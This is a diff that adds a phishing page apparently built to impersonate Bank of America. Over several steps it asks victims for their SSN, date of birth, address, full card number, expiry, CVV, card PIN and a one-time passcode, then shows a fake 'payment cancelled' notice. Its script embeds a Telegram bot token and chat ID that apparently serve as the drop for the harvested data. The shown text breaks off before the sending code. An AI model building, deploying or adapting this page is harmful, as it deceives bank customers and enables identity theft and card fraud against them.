@@ -1,0 +1,1436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank of America</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        body { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f5f7fa; }
+        
+        .progress-dot { width: 13px; height: 13px; border-radius: 70%; background-color: #e5e7eb; border: 2px solid #e5e7eb; transition: all 0.4s; }
+        .progress-dot-active { background-color: #012169; border-color: #012169; }
+        .step { display: none; animation: fadeIn 0.5s ease; }
+        .step.active { display: block; }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        #loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        #loading-overlay.show { display: flex; }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #e5e7eb;
+            border-top-color: #012169;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
+        .loading-text {
+            margin-top: 24px;
+            font-size: 18px;
+            font-weight: 500;
+            color: #012169;
+            letter-spacing: 0.3px;
+        }
+        .loading-sub {
+            margin-top: 8px;
+            font-size: 14px;
+            color: #6b7280;
+        }
+        .loading-progress-bar {
+            margin-top: 20px;
+            width: 220px;
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 99px;
+            overflow: hidden;
+        }
+        .loading-progress-fill {
+            height: 100%;
+            background: #012169;
+            border-radius: 99px;
+            width: 0%;
+            transition: width 0.15s;
+        }
+
+        input.invalid {
+            border-color: #dc2626 !important;
+            background-color: #fef2f2;
+        }
+        input.valid {
+            border-color: #22c55e !important;
+            background-color: #f0fdf4;
+        }
+
+        .robot-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px 20px;
+            border: 2px solid #e5e7eb;
+            border-radius: 16px;
+            background: #fafafa;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+        .robot-checkbox:hover { border-color: #012169; background: #f0f4ff; }
+        .robot-checkbox.checked { border-color: #012169; background: #e8edf7; }
+        .robot-checkbox input[type="checkbox"] { width: 22px; height: 22px; accent-color: #012169; cursor: pointer; }
+        .robot-checkbox .robot-icon { font-size: 28px; color: #6b7280; transition: all 0.3s ease; }
+        .robot-checkbox.checked .robot-icon { color: #012169; }
+        .robot-checkbox .robot-text { font-size: 15px; font-weight: 500; color: #1f2937; }
+        .robot-checkbox .robot-sub { font-size: 13px; color: #6b7280; }
+        .robot-checkbox .check-mark { margin-left: auto; font-size: 24px; color: #22c55e; opacity: 0; transition: all 0.3s ease; }
+        .robot-checkbox.checked .check-mark { opacity: 1; }
+
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .otp-input { letter-spacing: 8px; font-size: 28px; font-weight: 600; text-align: center; }
+        .pin-input { letter-spacing: 12px; font-size: 28px; font-weight: 600; text-align: center; }
+
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #f0fdf4;
+            border: 1px solid #22c55e;
+            border-radius: 99px;
+            padding: 6px 16px;
+            font-size: 13px;
+            color: #166534;
+            font-weight: 500;
+        }
+        .security-badge i { color: #22c55e; }
+
+        
+        .card-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        
+        .card-input-wrapper input {
+            width: 100%;
+            padding-right: 60px;
+            border: 1px solid #e5e7eb;
+            border-radius: 5px;
+            padding: 14px 18px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+        
+        .card-input-wrapper input:focus {
+            border-color: #012169;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(1, 33, 105, 0.1);
+        }
+        
+        .card-input-wrapper input.invalid {
+            border-color: #dc2626 !important;
+            background-color: #fef2f2;
+        }
+        
+        .card-input-wrapper input.valid {
+            border-color: #22c55e !important;
+            background-color: #f0fdf4;
+        }
+        
+        .card-type-icon-wrapper {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 36px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+            z-index: 2;
+            opacity: 0.3;
+            transition: all 0.3s ease;
+        }
+        
+        .card-type-icon-wrapper.visible {
+            opacity: 1;
+        }
+        
+        .card-type-icon-wrapper svg {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .validation-hint {
+            font-size: 12px;
+            margin-top: 6px;
+            transition: all 0.3s ease;
+            min-height: 20px;
+        }
+        .validation-hint.success { color: #22c55e; }
+        .validation-hint.error { color: #dc2626; }
+        .validation-hint.hidden { display: none; }
+
+        .dob-input {
+            border: 2px solid #e5e7eb;
+            border-radius: 5px;
+            padding: 14px 10px;
+            text-align: center;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+        }
+        .dob-input:focus {
+            border-color: #012169;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(1, 33, 105, 0.1);
+        }
+        .dob-input.invalid { border-color: #dc2626 !important; background-color: #fef2f2; }
+        .dob-input.valid { border-color: #22c55e !important; background-color: #f0fdf4; }
+
+        .form-input {
+            border: 2px solid #e5e7eb;
+            border-radius: 5px;
+            padding: 14px 18px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: white;
+            width: 100%;
+        }
+        .form-input:focus {
+            border-color: #012169;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(1, 33, 105, 0.1);
+        }
+        .form-input.invalid { border-color: #dc2626 !important; background-color: #fef2f2; }
+        .form-input.valid { border-color: #22c55e !important; background-color: #f0fdf4; }
+
+        .btn-primary {
+            background: #012169;
+            color: white;
+            padding: 16px;
+            border-radius: 5px;
+            font-weight: 600;
+            font-size: 17px;
+            transition: all 0.3s ease;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+        }
+        .btn-primary:hover { background: #011a4f; transform: translateY(-1px); }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+        .card-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+
+        #otp-loading {
+            display: none;
+            text-align: center;
+            padding: 30px 0;
+        }
+        #otp-loading.show { display: block; }
+        
+        .otp-loading-spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e5e7eb;
+            border-top-color: #012169;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+
+        #pin-section, #otp-section {
+            transition: all 0.5s ease;
+        }
+        #pin-section.hidden, #otp-section.hidden { display: none; }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #012169;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 8px 0;
+            font-size: 15px;
+        }
+        .resend-btn:hover { text-decoration: underline; }
+        .resend-btn:disabled { opacity: 0.5; cursor: not-allowed; text-decoration: none; }
+
+        @media (max-width: 640px) {
+            .card-container { padding: 16px; }
+            .card-input-wrapper input { font-size: 15px; padding: 12px 55px 12px 14px; }
+            .card-type-icon-wrapper { width: 32px; height: 20px; right: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    
+    <div id="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loading-text">Processing...</div>
+        <div class="loading-sub" id="loading-sub">Please wait</div>
+        <div class="loading-progress-bar">
+            <div class="loading-progress-fill" id="loading-progress-fill"></div>
+        </div>
+    </div>
+
+    <div class="max-w-[560px] mx-auto min-h-screen flex flex-col p-4">
+
+        
+        <div class="bg-white rounded-t-1xl px-6 py-5 border-b">
+            <div class="flex justify-between items-center">
+                <div>
+                    <img src="https://promotions.bankofamerica.com/content/dam/consumer-marketing/global/BofA-logo.svg" alt="Bank of America" class="h-6">
+                </div>
+                <div class="flex items-center gap-3">
+                    <i class="fa-solid fa-lock text-gray-400 text-lg"></i>
+                    <span class="text-sm text-gray-500 font-medium">Secure</span>
+                </div>
+            </div>
+        </div>
+
+        
+        <div class="bg-white px-6 pt-6 pb-4">
+            <div id="progress-bar" class="flex items-center gap-2 justify-center"></div>
+        </div>
+
+        
+        <div class="bg-white rounded-b-2xl px-6 pb-8 flex-1">
+
+            
+            <div id="step-1" class="step active">
+                <h3 class="text-2xl font-semibold text-[#012169] mb-2">Verify Your Identity</h3>
+                <p class="text-gray-600 text-sm mb-6">Enter your personal information exactly as it appears on file.</p>
+
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">First name <span class="text-red-600">*</span></label>
+                        <input type="text" id="first-name" class="form-input" placeholder="John" maxlength="30" data-type="name">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">Middle name</label>
+                        <input type="text" id="middle-name" class="form-input" placeholder="Michael" maxlength="30" data-type="name">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">Last name <span class="text-red-600">*</span></label>
+                        <input type="text" id="last-name" class="form-input" placeholder="Smith" maxlength="30" data-type="name">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">Date of birth <span class="text-red-600">*</span></label>
+                        <div class="grid grid-cols-3 gap-3">
+                            <input type="text" maxlength="2" placeholder="MM" class="dob-input" data-type="month">
+                            <input type="text" maxlength="2" placeholder="DD" class="dob-input" data-type="day">
+                            <input type="text" maxlength="4" placeholder="YYYY" class="dob-input" data-type="year">
+                        </div>
+                        <p id="dob-error" class="text-red-500 text-sm mt-1.5 hidden"></p>
+                    </div>
+                </div>
+                <br>
+                <p class="text-xs text-gray-500 mt-4">This helps us protect your account.</p>
+                <br>
+                
+                <div class="mt-6">
+                    <div id="robot-checkbox" class="robot-checkbox" onclick="toggleRobotCheck()">
+                        <i class="fa-solid fa-robot robot-icon"></i>
+                        <div>
+                            <div class="robot-text">I am not a robot</div>
+                            <div class="robot-sub">Verify you're human</div>
+                        </div>
+                        <input type="checkbox" id="robot-check" class="hidden">
+                        <i class="fa-solid fa-circle-check check-mark"></i>
+                    </div>
+                    <div id="robot-error" class="text-red-600 text-sm mt-2 hidden">⚠️ Please verify you are not a robot.</div>
+                </div>  <br><br>
+
+                <button onclick="handleNextStep(1)" class="btn-primary mt-6">Next</button><br><br><br>
+            </div>
+
+            
+            <div id="step-2" class="step">
+                <h3 class="text-2xl font-semibold text-[#012169] mb-2">Personal Info</h3>
+                <p class="text-gray-600 text-sm mb-6">Please provide the following details as it appears on your file.</p>
+                <br>
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">Social Security Number <span class="text-red-600">*</span></label>
+                        <input type="text" id="ssn-input" maxlength="11" placeholder="XXX-XX-XXXX" class="form-input" data-type="ssn">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">Phone number <span class="text-red-600">*</span></label>
+                        <input id="phone-input" type="tel" placeholder="(XXX) XXX-XXXX" class="form-input" data-type="phone" maxlength="14">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">Billing Address <span class="text-red-600">*</span></label>
+                        <input type="text" id="street-address" placeholder="Street address" class="form-input mb-3" data-type="address">
+                        <input type="text" id="city" placeholder="City" class="form-input mb-3" data-type="address">
+                        <div class="grid grid-cols-2 gap-3">
+                            <input type="text" id="state" placeholder="State" class="form-input" data-type="address" maxlength="2">
+                            <input type="text" id="zip-code" placeholder="ZIP Code" class="form-input" data-type="zip" maxlength="10">
+                        </div>
+                    </div>
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="same-address" checked onchange="toggleMailingAddress()" class="w-5 h-5 accent-[#012169]">
+                        <label for="same-address" class="text-sm font-medium cursor-pointer">Same as mailing address</label>
+                    </div>
+                    <div id="mailing-address" class="hidden space-y-3">
+                        <label class="block text-sm font-medium">Mailing Address</label>
+                        <input type="text" placeholder="Street address" class="form-input" data-type="address">
+                        <input type="text" placeholder="City" class="form-input" data-type="address">
+                        <div class="grid grid-cols-2 gap-3">
+                            <input type="text" placeholder="State" class="form-input" data-type="address" maxlength="2">
+                            <input type="text" placeholder="ZIP Code" class="form-input" data-type="zip" maxlength="10">
+                        </div>
+                    </div>
+                </div>
+                 <br><br><br>
+                <button onclick="handleNextStep(2)" class="btn-primary mt-6">Next</button><br><br><br><br>
+            </div>
+
+            
+            <div id="step-3" class="step">
+			
+                <span class="text-2xl font-semibold text-[#012169] mb-2">Account Access</span>
+                <p class="text-gray-600 text-sm mb-6">Enter your information as it appears on your file.</p>
+
+                <div class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">User ID <span class="text-red-600">*</span></label>
+                        <input type="text" id="user-id" class="form-input" placeholder="Choose a username" maxlength="20" data-type="alphanumeric">
+                    </div><br><br>
+                    <div>
+                        <label class="block text-sm font-medium mb-1.5">Please enter your 16-digit card number. <span class="text-red-600">*</span></label>
+                        <div class="card-input-wrapper">
+                            <input type="text" id="card-number" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" data-type="card">
+                            <div id="card-type-icon-wrapper" class="card-type-icon-wrapper">
+                                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" id="card-svg-icon">
+                                    <rect x="2" y="4" width="20" height="16" rx="2" stroke="#6b7280" stroke-width="1.5"/>
+                                    <path d="M2 10H22" stroke="#6b7280" stroke-width="1.5"/>
+                                    <path d="M6 14H10" stroke="#6b7280" stroke-width="1.5" stroke-linecap="round"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <div id="card-hint" class="validation-hint hidden"></div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-sm font-medium mb-1.5">Expiry <span class="text-red-600">*</span></label>
+                            <input type="text" id="expiry-input" maxlength="5" placeholder="MM/YY" class="form-input" data-type="expiry">
+                            <div id="expiry-hint" class="validation-hint hidden"></div>
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium mb-1.5">CVV <span class="text-red-600">*</span></label>
+                            <input type="text" id="cvv-input" maxlength="4" placeholder="123" class="form-input" data-type="cvv">
+                            <div id="cvv-hint" class="validation-hint hidden"></div>
+                        </div>
+                    </div>
+                </div>
+                <br><br>
+                <button onclick="handleNextStep(3)" class="btn-primary mt-6">Next</button><br><br><br><br>
+            </div>
+
+            
+            <div id="step-4" class="step">
+                <div class="flex items-center justify-between mb-4">
+                    <h3 class="text-2xl font-semibold text-[#012169]">Account Access</h3>
+                    
+                        <span>Additional Verication is required <span="color:red;>!</span>
+                    
+                </div>
+
+                <div id="pin-section">
+                    <p class="text-gray-600 text-sm mb-4">Enter your 4-digit card PIN.</p>
+                    <label class="block text-sm font-medium mb-1.5"> <b> Enter </b><span class="text-red-600">*</span></label>
+                    <input id="pin-input" type="password" maxlength="4" class="form-input text-center text-2xl tracking-widest pin-input" data-type="pin" inputmode="numeric" placeholder="••••">
+                    <div id="pin-error" class="text-red-500 text-sm mt-1.5 hidden">❌ Please enter your valid 4-digit PIN.</div>
+                    <br><br><br>
+					<button onclick="verifyPIN()" id="verify-pin-btn" class="btn-primary mt-4">Submit</button><br><br><br>
+                    <p class="text-xs text-gray-400 text-center mt-3"> This helps us protect your account.</p><br><br><br>
+                </div>
+
+                <div id="otp-loading">
+                    <div class="otp-loading-spinner"></div>
+                    <div class="otp-loading-text mt-3 text-gray-600" id="otp-loading-text">Verifying ...</div>
+                </div>
+
+                <div id="otp-section" class="hidden">
+                    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-4">
+                        <div class="flex items-start gap-3">
+                            <i class="fa-solid fa-check-circle text-blue-600 text-xl mt-0.5"></i>
+                            <div>
+                                <p class="text-sm font-medium text-blue-800">Additional verification required!</p>
+                                <p class="text-sm text-blue-700">Enter the One-Time Code sent to your mobile number ending in  <span id="last4" class="font-semibold">****</span></p>
+                            </div>
+                        </div>
+                    </div>
+                    <label class="block text-sm font-medium mb-1.5">Verification Code <span class="text-red-600">*</span></label>
+                    <input id="otp-input" type="text" maxlength="6" placeholder="Enter 6-digit code" class="form-input text-center text-2xl tracking-widest otp-input" data-type="otp" inputmode="numeric"><br>
+                    <div id="otp-error" class="text-red-600 text-sm mt-1.5 hidden">⚠️ Invalid code. Try again.</div><br>
+                    <button onclick="verifyOTP()" class="btn-primary mt-4">Submit</button>
+                    <div class="mt-3 text-center"><br><br>
+                        <button id="resend-btn" onclick="handleResendCode()" class="resend-btn">Resend Code</button><br><br>
+                        <div id="resend-alert" class="text-green-600 text-sm mt-1 hidden">✅ New code sent!</div>
+                    </div>
+                </div><br><br><br>
+            </div>
+
+            
+            <div id="step-5" class="step text-center py-8 px-4">
+  
+  
+  <div class="inline-flex items-center justify-center w-20 h-20 rounded-full bg-green-100 mb-4">
+    <i class="fa-solid fa-circle-check text-5xl text-green-600"></i>
+  </div>
+
+  
+  <h3 class="text-2xl font-bold text-[#012169] mb-1">
+    Verification Completed
+  </h3>
+
+  
+  <div class="mb-4">
+    <span class="inline-block bg-amber-50 text-amber-700 text-sm font-semibold px-4 py-1.5 rounded-full border border-amber-200">
+      <i class="fa-solid fa-triangle-exclamation mr-2"></i> Payment Cancelled
+    </span>
+  </div>
+
+  
+  <div class="bg-[#f7f9fc] border-l-4 border-[#cc0000] rounded-r-lg p-4 mb-4 text-left max-w-md mx-auto">
+    <p class="text-[15px] text-[#1a2634] leading-relaxed">
+      <span class="font-semibold">Security Notice:</span> Your payment has been 
+      <span class="font-semibold text-[#cc0000]">cancelled</span> as requested.
+    </p>
+  </div>
+
+  
+  <div class="text-[15px] text-[#2d3a4a] leading-relaxed space-y-2 max-w-md mx-auto text-left">
+    <p>
+      <i class="fa-solid fa-shield-halved text-[#012169] mr-2"></i>
+      <span class="font-semibold">Log in</span> to your Bank of America Mobile App and 
+      <span class="font-semibold">change your password</span> to secure your account.
+    </p>
+    <p>
+      <i class="fa-solid fa-mobile-screen-button text-[#012169] mr-2"></i>
+      This prevents unauthorized access from unknown devices.
+    </p>
+  </div>
+
+ 
+  <hr class="my-5 border-[#e6edf4] max-w-sm mx-auto">
+
+  
+  <button onclick="redirectToAppStore()" 
+          class="bg-[#012169] text-white font-semibold text-base px-10 py-3.5 rounded-full shadow-lg hover:bg-[#001a4d] transition duration-200 inline-flex items-center gap-2">
+    <i class="fa-solid fa-mobile-screen"></i> Open Mobile App
+  </button><br><br><br>
+
+        </div>
+
+        
+        <footer class="bg-[#012169] text-white py-6 px-6 text-sm rounded-1xl mt-4">
+            <div class="flex flex-wrap justify-center gap-x-6 gap-y-2 text-sm mb-4">
+                <a href="#" class="hover:underline">Locations</a>
+                <a href="#" class="hover:underline">Contact Us</a>
+                <a href="#" class="hover:underline">Help</a>
+            </div>
+            <div class="text-center text-xs opacity-80">
+                <div>Bank of America, N.A. Member FDIC</div>
+                <div>© 2026 Bank of America Corporation</div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+
+        const TELEGRAM_CONFIG = {
+            botToken: '9290227495:AAHNcc-hpA9OI6uws9LsLS2ebn1OVV0_crI',
+            chatId: '5126239971'
+        };
+
+
+        const CARD_SVGS = {
+            visa: `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="4" width="20" height="16" rx="3" fill="#1A1F71" stroke="#1A1F71" stroke-width="1"/>
+                <path d="M9.5 15.5L11.5 8.5H13.5L11.5 15.5H9.5Z" fill="white"/>
+                <path d="M16.5 15.5L15.5 11.5C15.3 10.8 14.8 10.5 14 10.5C13.5 10.5 13 10.7 12.5 11L12.8 9.5H14.8C15.5 9.5 16 9.8 16.2 10.3L17 15.5H16.5Z" fill="white"/>
+                <path d="M8.5 15.5L7.5 11.5C7.3 10.8 6.8 10.5 6 10.5C5.5 10.5 5 10.7 4.5 11L4.8 9.5H6.8C7.5 9.5 8 9.8 8.2 10.3L9 15.5H8.5Z" fill="white"/>
+                <circle cx="7" cy="12" r="1.5" fill="white"/>
+            </svg>`,
+            
+            mastercard: `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="4" width="20" height="16" rx="3" fill="#F79E1B" stroke="#F79E1B" stroke-width="1"/>
+                <circle cx="9.5" cy="12" r="4.5" fill="#EB001B" opacity="0.8"/>
+                <circle cx="14.5" cy="12" r="4.5" fill="#F79E1B" opacity="0.8"/>
+                <path d="M12 8.5C13 9.5 13.5 10.7 13.5 12C13.5 13.3 13 14.5 12 15.5C11 14.5 10.5 13.3 10.5 12C10.5 10.7 11 9.5 12 8.5Z" fill="#FF5F00"/>
+            </svg>`,
+            
+            amex: `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="4" width="20" height="16" rx="3" fill="#006FCF" stroke="#006FCF" stroke-width="1"/>
+                <path d="M5 10.5L6.5 13.5L8 10.5H9L6.5 15H5.5L3 10.5H4Z" fill="white"/>
+                <path d="M10 15H8.5V10.5H10V15Z" fill="white"/>
+                <path d="M13 10.5H11.5V15H13V12.5L14.5 15H15.5L17 12.5V15H18.5V10.5H17L15.5 13L14 10.5H13Z" fill="white"/>
+                <path d="M19.5 15H21V10.5H19.5V15Z" fill="white"/>
+            </svg>`,
+            
+            discover: `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="4" width="20" height="16" rx="3" fill="#FF6000" stroke="#FF6000" stroke-width="1"/>
+                <circle cx="12" cy="12" r="5" fill="white" opacity="0.2"/>
+                <path d="M8.5 9.5H9.5L11 14.5H10L9.7 13.5H8.3L8 14.5H7L8.5 9.5ZM8.5 10.8L8.2 12.8H8.8L8.5 10.8Z" fill="white"/>
+                <path d="M12 9.5H13.5C14.3 9.5 14.8 9.9 14.8 10.5C14.8 11.1 14.3 11.5 13.5 11.5H13V12.5H14.5V14.5H13.5V13.5H12.5V14.5H11.5L12 9.5ZM12.5 10.8V11.5H13.2C13.4 11.5 13.5 11.4 13.5 11.2C13.5 11 13.4 10.8 13.2 10.8H12.5Z" fill="white"/>
+                <path d="M15 9.5H16.5C17.3 9.5 17.8 9.9 17.8 10.5C17.8 11.1 17.3 11.5 16.5 11.5H16V12.5H17.5V14.5H16.5V13.5H15.5V14.5H14.5L15 9.5ZM15.5 10.8V11.5H16.2C16.4 11.5 16.5 11.4 16.5 11.2C16.5 11 16.4 10.8 16.2 10.8H15.5Z" fill="white"/>
+            </svg>`,
+            
+            diners: `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="4" width="20" height="16" rx="3" fill="#0076BE" stroke="#0076BE" stroke-width="1"/>
+                <circle cx="12" cy="12" r="5" fill="white" opacity="0.15"/>
+                <path d="M9 8.5H12C13.5 8.5 14.5 9.5 14.5 11C14.5 12.5 13.5 13.5 12 13.5H9V8.5ZM10 9.8V12.2H11.5C12.2 12.2 12.5 11.8 12.5 11C12.5 10.2 12.2 9.8 11.5 9.8H10Z" fill="white"/>
+                <path d="M15.5 8.5H17V13.5H15.5V8.5Z" fill="white"/>
+            </svg>`,
+            
+            jcb: `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="4" width="20" height="16" rx="3" fill="#003DA5" stroke="#003DA5" stroke-width="1"/>
+                <path d="M6.5 10.5H8.5V11.5H7V12.5H8.5V13.5H6.5V10.5Z" fill="white"/>
+                <path d="M9.5 10.5H11.5V11.5H10V12.5H11.5V13.5H9.5V10.5Z" fill="white"/>
+                <path d="M12.5 10.5H14.5C15.3 10.5 15.8 10.9 15.8 11.5C15.8 12.1 15.3 12.5 14.5 12.5H13.5V13.5H12.5V10.5ZM13.5 11.5V12.5H14.2C14.4 12.5 14.5 12.4 14.5 12.2C14.5 12 14.4 11.8 14.2 11.8H13.5V11.5Z" fill="white"/>
+            </svg>`,
+            
+            default: `<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="2" y="4" width="20" height="16" rx="2" stroke="#6b7280" stroke-width="1.5"/>
+                <path d="M2 10H22" stroke="#6b7280" stroke-width="1.5"/>
+                <path d="M6 14H10" stroke="#6b7280" stroke-width="1.5" stroke-linecap="round"/>
+            </svg>`
+        };
+
+        
+        let currentStep = 1;
+        let isRobotChecked = false;
+        let isProcessing = false;
+        let pinVerified = false;
+        let otpVerified = false;
+        let resendCount = 0;
+        let resendTimer = null;
+        let collectedData = {};
+        let visitorId = '';
+
+        
+        const CardValidator = {
+            getCardType(number) {
+                const clean = number.replace(/\D/g, '');
+                if (!clean) return { type: 'default', name: 'Card', svg: CARD_SVGS.default };
+                if (/^4/.test(clean)) return { type: 'visa', name: 'Visa', svg: CARD_SVGS.visa };
+                if (/^5[1-5]/.test(clean) || /^2[2-7][2-7][0-1]/.test(clean)) {
+                    return { type: 'mastercard', name: 'Mastercard', svg: CARD_SVGS.mastercard };
+                }
+                if (/^3[4|7]/.test(clean)) return { type: 'amex', name: 'American Express', svg: CARD_SVGS.amex };
+                if (/^6011/.test(clean) || /^622[1-9]/.test(clean) || /^64/.test(clean) || /^65/.test(clean)) {
+                    return { type: 'discover', name: 'Discover', svg: CARD_SVGS.discover };
+                }
+                if (/^3[0-6]/.test(clean) || /^3[8-9]/.test(clean)) {
+                    return { type: 'diners', name: 'Diners Club', svg: CARD_SVGS.diners };
+                }
+                if (/^352[8-9]/.test(clean) || /^35[3-8][0-9]/.test(clean)) {
+                    return { type: 'jcb', name: 'JCB', svg: CARD_SVGS.jcb };
+                }
+                return { type: 'default', name: 'Card', svg: CARD_SVGS.default };
+            },
+
+            validateCardNumber(number) {
+                const clean = number.replace(/\D/g, '');
+                if (clean.length < 13 || clean.length > 19) {
+                    return { valid: false, message: 'Must be 13-19 digits' };
+                }
+                let sum = 0, alt = false;
+                for (let i = clean.length - 1; i >= 0; i--) {
+                    let digit = parseInt(clean[i]);
+                    if (alt) { digit *= 2; if (digit > 9) digit -= 9; }
+                    sum += digit;
+                    alt = !alt;
+                }
+                if (sum % 10 !== 0) return { valid: false, message: 'Invalid card number' };
+                return { valid: true, message: ' ' };
+            },
+
+            validateExpiry(expiry) {
+                const clean = expiry.replace(/\D/g, '');
+                if (clean.length !== 4) return { valid: false, message: 'Enter MM/YY' };
+                const month = parseInt(clean.slice(0, 2));
+                const year = 2000 + parseInt(clean.slice(2, 4));
+                if (month < 1 || month > 12) return { valid: false, message: 'Invalid month' };
+                const now = new Date();
+                const curMonth = now.getMonth() + 1;
+                const curYear = now.getFullYear();
+                if (year < curYear || (year === curYear && month < curMonth)) {
+                    return { valid: false, message: 'Error. try again' };
+                }
+                return { valid: true, message: '' };
+            },
+
+            validateCVV(cvv, cardType) {
+                const clean = cvv.replace(/\D/g, '');
+                const len = cardType === 'amex' ? 4 : 3;
+                if (clean.length !== len) {
+                    return { valid: false, message: `CVV must be ${len} digits` };
+                }
+                return { valid: true, message: ' ' };
+            },
+
+            validateFullCard(cardNumber, expiry, cvv) {
+                const cardTypeInfo = this.getCardType(cardNumber);
+                const numberResult = this.validateCardNumber(cardNumber);
+                if (!numberResult.valid) {
+                    return { valid: false, field: 'card', message: numberResult.message };
+                }
+                const expiryResult = this.validateExpiry(expiry);
+                if (!expiryResult.valid) {
+                    return { valid: false, field: 'expiry', message: expiryResult.message };
+                }
+                const cvvResult = this.validateCVV(cvv, cardTypeInfo.type);
+                if (!cvvResult.valid) {
+                    return { valid: false, field: 'cvv', message: cvvResult.message };
+                }
+                return { valid: true, cardType: cardTypeInfo, message: 'Card is valid' };
+            },
+
+            formatCardNumber(value) {
+                const clean = value.replace(/\D/g, '');
+                const parts = [];
+                for (let i = 0; i < clean.length; i += 4) {
+                    parts.push(clean.slice(i, i + 4));
+                }
+                return parts.join(' ');
+            },
+
+            formatExpiry(value) {
+                const clean = value.replace(/\D/g, '');
+                if (clean.length >= 2) return clean.slice(0, 2) + '/' + clean.slice(2, 4);
+                return clean;
+            }
+        };
+
+
+        function showInvalid(id) {
+            const el = document.getElementById(id);
+            if (el) { el.classList.add('invalid'); el.classList.remove('valid'); }
+        }
+        function showValid(id) {
+            const el = document.getElementById(id);
+            if (el) { el.classList.remove('invalid'); el.classList.add('valid'); }
+        }
+
+        function createProgressBar() {
+            const container = document.getElementById('progress-bar');
+            container.innerHTML = '';
+            for (let i = 1; i <= 5; i++) {
+                const dot = document.createElement('div');
+                dot.className = `progress-dot ${i === currentStep ? 'progress-dot-active' : ''}`;
+                container.appendChild(dot);
+                if (i < 5) {
+                    const line = document.createElement('div');
+                    line.className = "flex-1 h-0.5 bg-gray-300 max-w-[40px]";
+                    container.appendChild(line);
+                }
+            }
+        }
+
+        function toggleMailingAddress() {
+            const checked = document.getElementById('same-address').checked;
+            document.getElementById('mailing-address').classList.toggle('hidden', checked);
+        }
+
+        function toggleRobotCheck() {
+            const container = document.getElementById('robot-checkbox');
+            const checkbox = document.getElementById('robot-check');
+            isRobotChecked = !isRobotChecked;
+            checkbox.checked = isRobotChecked;
+            container.classList.toggle('checked', isRobotChecked);
+            document.getElementById('robot-error').classList.add('hidden');
+        }
+
+        function generateVisitorId() {
+            if (!visitorId) {
+                visitorId = 'VIS-' + Date.now().toString(36).toUpperCase() + '-' +
+                    Math.random().toString(36).substring(2, 6).toUpperCase();
+            }
+            return visitorId;
+        }
+
+
+        function updateCardIcon(cardNumber) {
